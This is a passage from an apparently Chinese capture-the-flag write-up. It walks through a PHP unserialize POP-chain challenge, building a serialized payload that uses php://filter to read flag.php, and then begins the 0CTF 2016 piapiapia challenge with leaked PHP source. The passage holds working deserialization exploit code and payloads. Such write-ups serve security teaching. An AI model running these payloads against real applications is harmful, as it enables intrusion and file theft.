<span class="token string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>一步步审计代码</p><p>首先看到最后的if语句，题目给出了一个可以get的pop参数，随后对其进行反序列化操作，于是直接想到利用反序列化漏洞，再往上看找利用点</p><p>题目给出了三个类，观察可利用点可以在<code>Modifier</code>对象中看到一个include函数，这里就可以利用文件包含从而达到任意文件读取的效果，具体方法只要令<code>include</code>的<code>value</code>为<code>php://filter/read=convert.base64-encode/resource=./flag.php</code>即可读取flag文件，所以就需要想办法利用这个点</p><p>可用看到<code>Modifier</code>对象中有一个<code>__invoke</code>方法代码如下</p><pre class=" language-PHP"><code class="language-PHP">public function __invoke(){    $this->append($this->var);}</code></pre><p>里面调用了可触发条件的<code>append</code>方法，而此方法中的<code>var</code>属性是可控的，于是就可以直接利用<code>var</code>属性来调用<code>append</code>方法，从而达到文件包含的效果，初步构造序列化参数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=./flag.php';</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span></code></pre><p>而<code>__invoke</code>函数的使用方法是当尝试以调用函数的方法调用一个对象时触发，于是找到可触发条件，可以在下面的<code>Test</code>对象中看到一个<code>__get</code>方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个方法里面返回的参数刚好可以作为函数条件调用一个对象，于是可以利用此方法调用<code>Modifier</code>对象，只需令里面的参数<code>p</code>为创建的新的<code>Modifier</code>对象即可，就可以触发<code>__invoke</code>函数，而<code>Test</code>对象中的参数<code>p</code>是可控的，于是就可以进一步构造序列化参数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=./flag.php';</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span></code></pre><p>随后就需要想办法如何触发<code>__get</code>函数，<code>__get</code>函数的触发条件是当对象读取不可访问的属性的时候触发，于是就需要构造一个不可访问的属性来触发此函数，当然这个属性在对象内部肯定是不存在的，于是就要到外部去找，可以看到<code>Show</code>对象中的<code>__toString</code>方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里就可以构造<code>str</code>参数为一个<code>Test</code>对象，然后调用<code>source</code>属性，而<code>Test</code>对象中是没有<code>source</code>这个属性的，这样就可以触发对象中的<code>__get</code>方法，而<code>Show</code>对象中的<code>str</code>属性是可控的，于是就可以接着构造</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=./flag.php';</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span></code></pre><p>然后就该想想<code>__toString</code>方法该如何触发了，<code>__toString</code>方法触发条件是当对象被当做一个字符串被调用，于是寻找触发点可以在函数下方看到一个<code>__wakeup</code>方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>__wakeup</code>函数之中的<code>source</code>属性在进行<code>preg_match</code>正则匹配的时候会被当做一个字符串来使用，于是就可以令<code>source</code>属性为上一个构造的<code>Show</code>对象，这样在进行正则匹配判断的时候就会吧这个对象当做字符串来处理，从而就可以触发<code>__toString</code>方法，于是就可以写出构造方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=./flag.php';</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span></code></pre><p><code>__wakeup</code>触发的条件是当我们反序列化这个对象的时候就会触发这个函数，这个方法就无需我们再去找触发点了，只需要把<code>Show</code>反序列化就可以了，而这题的<code>pop</code>参数就提供了这样的条件，于是最终构造出序列化方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=./flag.php';</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>于是最总payload：</p><pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"source"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Show"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"source"</span><span class="token punctuation">;</span>N<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"str"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"Modifier"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"%00*%00var"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=./flag.php";}}}s:3:"str";N;}</span></code></pre><p>get传入pop=payload即可得到base64加密后的flag，解密即可。</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412180255952.png" alt="" loading="lazy"></p><p>题目一共四个界面，login，register，update和profile（也就是第一个显示界面）</p><p>前期探测sql注入和文件上传好像都没啥效果，随后扫一下发现存在<a href="http://www.zip源码泄露，代码审计" target="_blank" rel="noopener">www.zip源码泄露，代码审计</a></p><p>简单看一下，省略HTML和一些无关部分</p><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token markup">&lt; 3 or strlen($username) ></span> <span class="token number">16</span><span class="token punctuation">)</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid user name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token markup">&lt; 3 or strlen($password) ></span> <span class="token number">16</span><span class="token punctuation">)</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: profile.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid user name or password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span></code></pre><p>register.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token markup">&lt; 3 or strlen($username) ></span> <span class="token number">16</span><span class="token punctuation">)</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid user name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token markup">&lt; 3 or strlen($password) ></span> <span class="token number">16</span><span class="token punctuation">)</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">'Register OK!&lt;a href="index.php">Please Login&lt;/a>'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'User name Already Exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span></code></pre><p>update.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\d{11}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token markup">&lt; 5 or $file['size'] ></span> <span class="token number">1000000</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Update Profile Success!&lt;a href="profile.php">Your Profile&lt;/a>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token delimiter">&lt;?php</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>profile.php</p><pre class=" language-php"><code class="language-php"><span 